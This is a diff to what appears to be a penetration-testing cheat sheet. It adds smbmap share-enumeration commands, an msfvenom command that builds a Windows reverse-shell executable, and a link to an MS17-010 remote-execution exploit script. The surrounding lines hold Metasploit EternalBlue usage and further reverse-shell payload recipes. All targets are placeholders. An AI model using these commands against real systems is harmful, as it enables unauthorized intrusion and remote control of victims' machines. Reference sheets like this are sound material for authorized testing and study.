@@ -64,6 +64,8 @@ $ smbclient -L <IP address>
 $ smbclient -L <IP address> -U <username>
 $ smbclient \\\\<IP address>\\c$
 $ smbclient \\\\<IP address>\\c$ -U <username>
+$ smbmap -H <IP address>
+$ smbmap -H <IP address> -u <username> -p <password>
 msf> use auxiliary/scanner/smb/smb_version
 msf> use exploit/windows/smb/ms17_010_eternalblue
 ```
@@ -326,6 +328,7 @@ $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP address> LPORT=<Port> -f
 $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP address> LPORT=<Port> -f aspx > shell.aspx
 $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f raw > shell.jsp
 $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f war > shell.war
+$ msfvenom -p windows/shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f exe -o shell.exe
 ```
 
 #9 - Online Resources
@@ -372,4 +375,5 @@ https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
 ```
 https://github.com/worawit/MS17-010/blob/master/zzz_exploit.py
 $ ./zzz_exploit.py <IP address> ntsvcs
+https://github.com/helviojunior/MS17-010/blob/master/send_and_execute.py
 ```
